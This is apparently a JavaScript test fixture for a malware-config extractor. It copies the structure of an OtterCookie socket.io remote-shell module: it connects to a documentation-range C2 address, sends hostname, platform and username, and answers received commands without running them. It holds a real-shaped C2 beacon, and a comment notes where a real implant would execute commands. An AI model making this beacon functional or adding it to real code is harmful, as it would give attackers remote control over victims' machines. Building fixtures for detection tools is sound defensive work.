// crumble test fixture. Not malware and not functional: it reproduces the
// layout of an OtterCookie socket.io shell module (connect, register,
// receive "command", answer with "message") so the extractor has something
// real-shaped to chew on. The C2 is a TEST-NET-3 address (RFC 5737) and the
// command handler never executes anything it receives.
const { io } = require("socket.io-client");
const os = require("os");
const cp = require("child_process");

const uid = "c7f2a1e09b";
const t = "5";
const host = "203.0.113.47";
const port = 1418;

function info() {
  return {
    uid: uid,
    t: t,
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
  };
}

const socket = io("http://" + host + ":" + port, {
  reconnectionAttempts: 15,
  reconnectionDelay: 2000,
  timeout: 10000,
});

socket.on("connect", () => {
  socket.emit("identify", info());
});

socket.on("command", (msg) => {
  // A real implant would hand msg.message to cp.exec(). The fixture only
  // reports what it was asked to run.
  void cp;
  socket.emit("message", { uid: uid, command: msg.message, result: "fixture: not executed" });
});

socket.on("disconnect", () => {});
